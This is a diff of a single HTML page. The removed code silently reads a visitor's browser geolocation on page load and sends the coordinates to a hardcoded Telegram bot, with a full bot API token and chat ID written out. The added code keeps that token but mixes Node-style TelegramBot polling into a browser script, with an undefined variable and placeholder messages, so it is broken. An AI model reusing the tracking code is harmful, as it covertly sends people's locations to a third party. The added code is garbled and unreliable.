@@ -32,27 +32,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Get User Location</title>
+    <title>Telegram Bot Integration</title>
 </head>
 <body>
     <script>
-        var botApiToken = '6438227169:AAEKg3lNj64EomHDUbseoWDE8ad91bjLvNc';
-        var telegramId = '1776168152';
-        
-        function sendLocationToTelegram(latitude, longitude) {
-            var url = 'https://api.telegram.org/bot' + botApiToken + '/sendLocation?chat_id=' + telegramId + '&latitude=' + latitude + '&longitude=' + longitude;
-            fetch(url)
-                .then(response => response.json())
-                .then(data => console.log(data))
-                .catch(error => console.error('Error:', error));
-        }
+        const botApiToken = '6438227169:AAEKg3lNj64EomHDUbseoWDE8ad91bjLvNc';
+        const telegramId = '1776168152';
 
-        // Get user's location (latitude and longitude) using browser's geolocation API
-        navigator.geolocation.getCurrentPosition(position => {
-            var latitude = position.coords.latitude;
-            var longitude = position.coords.longitude;
-            sendLocationToTelegram(latitude, longitude);
-        });
+
+        
+const bot = new TelegramBot(botToken, { polling: true });
+
+bot.on('message', (msg) => {
+  const chatId = msg.chat.id;
+  bot.sendMessage(chatId, 'Mobile Charge: {charge_amount}');
+  bot.sendMessage(chatId, 'Data Type: {data_type}');
+  bot.sendMessage(chatId, 'Mobile Name: {mobile_name}');
+});
+
+        // Code to send data to Telegram Bot
+        // Implement your logic here
     </script>
 </body>
 </html>
